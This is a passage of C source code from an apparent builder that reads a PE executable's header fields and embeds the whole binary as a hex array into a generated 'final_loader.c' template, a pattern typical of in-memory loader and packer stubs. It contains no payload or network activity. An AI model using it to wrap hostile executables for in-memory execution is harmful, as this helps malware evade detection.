    IMAGE_NT_HEADERS64* nt_headers = (IMAGE_NT_HEADERS64*)(file_data + dos_header->e_lfanew);
    DWORD entry_point_rva = nt_headers->OptionalHeader.AddressOfEntryPoint;
    ULONG_PTR image_base = nt_headers->OptionalHeader.ImageBase;
    DWORD size_of_image = nt_headers->OptionalHeader.SizeOfImage;

    char* template_data = NULL;
    FILE* t_fp = fopen(template_path, "r");
    if (t_fp) {
        fseek(t_fp, 0, SEEK_END);
        size_t t_size = ftell(t_fp);
        fseek(t_fp, 0, SEEK_SET);
        template_data = (char*)malloc(t_size + 1);
        fread(template_data, 1, t_size, t_fp);
        template_data[t_size] = '\0';
        fclose(t_fp);
    } else {
        template_data = strdup(default_template);
    }

    FILE* out_fp = fopen("final_loader.c", "w");
    if (!out_fp) { perror("Error opening final_loader.c"); return 1; }

    char* p = template_data;
    while (*p) {
        if (strncmp(p, "// PE_BLOB_ARRAY", 16) == 0) {
            print_hex_array(out_fp, file_data, file_size);
            p = strchr(p, '\n'); if (p) p++;
            p = strchr(p, '\n'); if (p) p++;
        } else if (strncmp(p, "// ENTRY_POINT_RVA", 18) == 0) {
            fprintf(out_fp, "// ENTRY_POINT_RVA\nDWORD entry_point_rva = 0x%X;\n", entry_point_rva);
            p = strchr(p, '\n'); if (p) p++;
            p = strchr(p, '\n'); if (p) p++;
        } else if (strncmp(p, "// IMAGE_BASE", 13) == 0) {
            fprintf(out_fp, "// IMAGE_BASE\nULONG_PTR image_base = 0x%llX;\n", (unsigned long long)image_base);
            p = strchr(p, '\n'); if (p) p++;
            p = strchr(p, '\n'); if (p) p++;
        } else if (strncmp(p, "// SIZE_OF_IMAGE", 16) == 0) {
            fprintf(out_fp, "// SIZE_OF_IMAGE\nSIZE_T size_of_image = 0x%X;\n", size_of_image);
            p = strchr(p, '\n'); if (p) p++;
            p = strchr(p, '\n'); if (p) p++;
        } else {
            fputc(*p++, out_fp);
        }
    }

    fclose(out_fp);
    free(file_data); free(template_data);
    printf("Generated final_loader.c successfully.\n");
    return 0;
}
